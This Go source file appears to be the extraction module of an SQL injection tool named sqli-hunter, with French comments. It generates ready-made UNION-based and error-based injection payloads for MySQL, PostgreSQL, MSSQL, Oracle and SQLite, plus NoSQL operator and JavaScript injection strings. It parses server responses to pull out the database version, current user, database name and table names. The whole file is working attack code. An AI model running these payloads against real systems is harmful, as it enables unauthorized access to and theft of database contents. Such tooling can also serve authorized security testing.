package extractor

import (
	"regexp"
	"strings"

	"github.com/sqli-hunter/sqli-hunter/internal/models"
)

// ExtractionJob décrit une tentative d'extraction.
type ExtractionJob struct {
	DataType DataType
	Payload  string
	Method   string
}

type DataType = models.DataType

const (
	DataVersion  = models.DataVersion
	DataDatabase = models.DataDatabase
	DataUser     = models.DataUser
	DataTables   = models.DataTables
	DataColumns  = models.DataColumns
	DataDump     = models.DataDump
)

// BuildJobs génère les jobs d'extraction selon le DBMS et le type de vuln.
func BuildJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
	dbms = normalizeDBMS(dbms)

	switch vulnType {
	case models.NoSQL:
		return nosqlJobs()
	default:
		return sqliJobs(dbms, vulnType)
	}
}

func sqliJobs(dbms string, vulnType models.VulnType) []ExtractionJob {
	var jobs []ExtractionJob

	switch vulnType {
	case models.SQLiUnion:
		jobs = append(jobs, buildUnionJobs(dbms)...)
	case models.SQLiError:
		jobs = append(jobs, buildErrorJobs(dbms)...)
	case models.SQLiBoolean, models.SQLiTime:
		// Blind : uniquement error-based (pas de UNION sur réponses texte)
		jobs = append(jobs, buildErrorJobs(dbms)...)
	default:
		jobs = append(jobs, buildUnionJobs(dbms)...)
		jobs = append(jobs, buildErrorJobs(dbms)...)
	}
	return jobs
}

func buildUnionJobs(dbms string) []ExtractionJob {
	var jobs []ExtractionJob
	unionCols := []int{1, 2, 3, 4}
	for _, cols := range unionCols {
		for _, def := range sqliDefs(dbms) {
			selectExpr := buildUnionSelect(def.expr, cols)
			jobs = append(jobs, ExtractionJob{
				DataType: def.dtype,
				Payload:  `' UNION SELECT ` + selectExpr + `--`,
				Method:   "union",
			})
		}
	}
	return jobs
}

func buildErrorJobs(dbms string) []ExtractionJob {
	var jobs []ExtractionJob
	if dbms == "mysql" || dbms == "generic" || dbms == "" {
		for _, def := range errorDefs() {
			jobs = append(jobs, ExtractionJob{
				DataType: def.dtype,
				Payload:  def.payload,
				Method:   "error",
			})
		}
	}
	if dbms == "mssql" || dbms == "generic" || dbms == "" {
		jobs = append(jobs, ExtractionJob{
			DataType: DataVersion,
			Payload:  `' AND 1=CONVERT(int,@@version)--`,
			Method:   "error",
		})
	}
	return jobs
}

type sqliDef struct {
	dtype DataType
	expr  string
}

func sqliDefs(dbms string) []sqliDef {
	switch dbms {
	case "postgresql":
		return []sqliDef{
			{DataVersion, "version()"},
			{DataDatabase, "current_database()"},
			{DataUser, "current_user"},
			{DataTables, "(SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public')"},
		}
	case "mssql":
		return []sqliDef{
			{DataVersion, "@@version"},
			{DataDatabase, "db_name()"},
			{DataUser, "system_user"},
			{DataTables, "(SELECT TOP 1 name FROM sys.tables)"},
		}
	case "oracle":
		return []sqliDef{
			{DataVersion, "banner FROM v$version WHERE ROWNUM=1"},
			{DataUser, "user FROM dual"},
		}
	case "sqlite":
		return []sqliDef{
			{DataVersion, "sqlite_version()"},
			{DataTables, "name FROM sqlite_master WHERE type='table'"},
		}
	default: // mysql
		return []sqliDef{
			{DataVersion, "@@version"},
			{DataDatabase, "database()"},
			{DataUser, "user()"},
			{DataTables, "(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database())"},
		}
	}
}

type errorDef struct {
	dtype   DataType
	payload string
}

func errorDefs() []errorDef {
	return []errorDef{
		{DataVersion, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--`},
		{DataDatabase, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--`},
		{DataUser, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,user(),0x7e))--`},
		{DataTables, `1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--`},
		{DataVersion, `1' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)--`},
	}
}

func nosqlJobs() []ExtractionJob {
	return []ExtractionJob{
		{DataDump, `{"$regex":".*"}`, "nosql"},
		{DataDump, `{"$ne":null}`, "nosql"},
		{DataDump, `{"$gt":""}`, "nosql"},
		{DataUser, `{"username":{"$regex":".*"}}`, "nosql"},
		{DataTables, `0]; return db.getCollectionNames(); var a=[0`, "nosql"},
	}
}

func buildUnionSelect(expr string, cols int) string {
	if cols <= 1 {
		return expr
	}
	parts := []string{expr}
	for i := 1; i < cols; i++ {
		parts = append(parts, "NULL")
	}
	return strings.Join(parts, ",")
}

func buildNullList(cols int) string {
	parts := make([]string, cols)
	for i := range parts {
		parts[i] = "NULL"
	}
	return strings.Join(parts, ",")
}

func normalizeDBMS(dbms string) string {
	dbms = strings.ToLower(dbms)
	if dbms == "" {
		return "mysql"
	}
	return dbms
}

// ParseResponse extrait les données de la réponse HTTP.
func ParseResponse(body, payload, method string, dtype DataType) (string, bool) {
	// EXTRACTVALUE / UPDATEXML : données entre ~
	reTilde := regexp.MustCompile(`~([^~]+)~`)
	if m := reTilde.FindStringSubmatch(body); len(m) > 1 {
		val := strings.TrimSpace(m[1])
		if isValidExtractedValue(dtype, val, payload) {
			return val, true
		}
	}

	// Versions MySQL
	reMySQLVer := regexp.MustCompile(`(?i)(\d+\.\d+\.\d+[-\w]*(?:mysql|mariadb)?[^\s<"]*)`)
	if dtype == DataVersion {
		if m := reMySQLVer.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
			return m[1], true
		}
	}

	// PostgreSQL version
	rePG := regexp.MustCompile(`(?i)(PostgreSQL \d+\.\d+[^\s<"]*)`)
	if dtype == DataVersion {
		if m := rePG.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
			return m[1], true
		}
	}

	// MSSQL
	reMSSQL := regexp.MustCompile(`(?i)(Microsoft SQL Server \d+[^\s<"]*)`)
	if dtype == DataVersion {
		if m := reMSSQL.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
			return m[1], true
		}
	}

	// database/tables : uniquement via EXTRACTVALUE (~...~) ou UNION confirmé
	if dtype == DataDatabase || dtype == DataTables {
		if strings.Contains(strings.ToLower(payload), "database()") {
			reDB := regexp.MustCompile(`(?i)\b([a-z][a-z0-9]*(?:_[a-z0-9]+)+)\b`)
			if m := reDB.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
				return m[1], true
			}
		}
		if dtype == DataTables {
			reTables := regexp.MustCompile(`(?i)\b([a-z][a-z0-9_]*(?:,[a-z][a-z0-9_]*){2,})\b`)
			if m := reTables.FindStringSubmatch(body); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
				return m[1], true
			}
		}
	}

	// NoSQL dump JSON
	if dtype == DataDump || dtype == DataUser {
		if strings.Contains(body, `"users"`) || strings.Contains(body, `"email"`) {
			return truncate(body, 500), true
		}
		if strings.Contains(body, `"tenants"`) || strings.Contains(body, `"admin"`) {
			return truncate(body, 500), true
		}
	}

	// UNION : version ou identifiants DB explicites
	if method == "union" && len(body) > 10 {
		cleaned := body
		if payload != "" {
			cleaned = strings.ReplaceAll(cleaned, payload, "")
		}
		switch dtype {
		case DataVersion:
			for _, re := range []*regexp.Regexp{
				regexp.MustCompile(`(?i)\d+\.\d+\.\d+[-\w.]*(?:mysql|mariadb|postgresql|sql server)`),
				regexp.MustCompile(`(?i)PostgreSQL \d+\.\d+`),
				regexp.MustCompile(`(?i)Microsoft SQL Server \d+`),
			} {
				if m := re.FindString(cleaned); m != "" && isValidExtractedValue(dtype, m, payload) {
					return m, true
				}
			}
		case DataUser:
			if m := regexp.MustCompile(`(?i)root@[\w%.]+`).FindString(cleaned); m != "" && isValidExtractedValue(dtype, m, payload) {
				return m, true
			}
		case DataTables:
			if m := regexp.MustCompile(`(?i)[a-z][a-z0-9_]+(?:,[a-z][a-z0-9_]+){2,}`).FindString(cleaned); m != "" && isValidExtractedValue(dtype, m, payload) {
				return m, true
			}
		case DataDatabase:
			if m := regexp.MustCompile(`(?i)\b([a-z][a-z0-9]*(?:_[a-z0-9]+)+)\b`).FindStringSubmatch(cleaned); len(m) > 1 && isValidExtractedValue(dtype, m[1], payload) {
				return m[1], true
			}
		}
	}

	return "", false
}

func isValidExtractedValue(dtype DataType, value, payload string) bool {
	v := strings.TrimSpace(value)
	if v == "" || len(v) < 2 {
		return false
	}
	lower := strings.ToLower(v)
	if isNoise(lower) {
		return false
	}
	// Rejeter fragments SQL / payload réfléchi
	sqlFragments := []string{
		"group_concat", "information_schema", "extractvalue", "updatexml",
		"concat(0x", "select ", "union ", "from ", "where ", "null--",
		"xpath syntax", "syntax error",
	}
	for _, frag := range sqlFragments {
		if strings.Contains(lower, frag) {
			return false
		}
	}
	if payload != "" && strings.Contains(strings.ToLower(payload), lower) {
		return false
	}
	switch dtype {
	case DataDatabase:
		// Noms de DB : identifiant avec underscore ou alphanum ≥ 4 sans être une version
		if regexp.MustCompile(`^\d+\.\d+`).MatchString(v) {
			return false
		}
		return regexp.MustCompile(`^[a-z][a-z0-9_]{3,}$`).MatchString(lower)
	case DataTables:
		if strings.Contains(lower, ",") {
			return regexp.MustCompile(`^[a-z][a-z0-9_]+(,[a-z][a-z0-9_]+)+$`).MatchString(lower)
		}
		return regexp.MustCompile(`^[a-z][a-z0-9_]{3,}$`).MatchString(lower)
	case DataVersion:
		return regexp.MustCompile(`\d+\.\d+`).MatchString(v) ||
			strings.Contains(lower, "postgresql") ||
			strings.Contains(lower, "sql server")
	case DataUser:
		return strings.Contains(v, "@") || regexp.MustCompile(`^[a-z][a-z0-9_]{2,}$`).MatchString(lower)
	}
	return true
}

func isNoise(s string) bool {
	noise := map[string]bool{
		"null": true, "select": true, "union": true, "html": true,
		"body": true, "http": true, "result": true, "error": true,
		"the": true, "and": true, "for": true, "from": true,
		"have": true, "results": true, "total": true, "items": true,
		"account": true, "product": true, "search": true, "comment": true,
		"balance": true, "hotel": true, "flight": true, "patient": true,
		"report": true, "generated": true, "artist": true, "artists": true,
		"login": true, "attempt": true, "statement": true, "invoice": true,
		"page": true, "orders": true, "contact": true, "booking": true,
		"record": true, "post": true, "review": true, "rating": true,
		"database": true, "syntax": true, "near": true, "line": true,
	}
	return noise[strings.ToLower(s)]
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
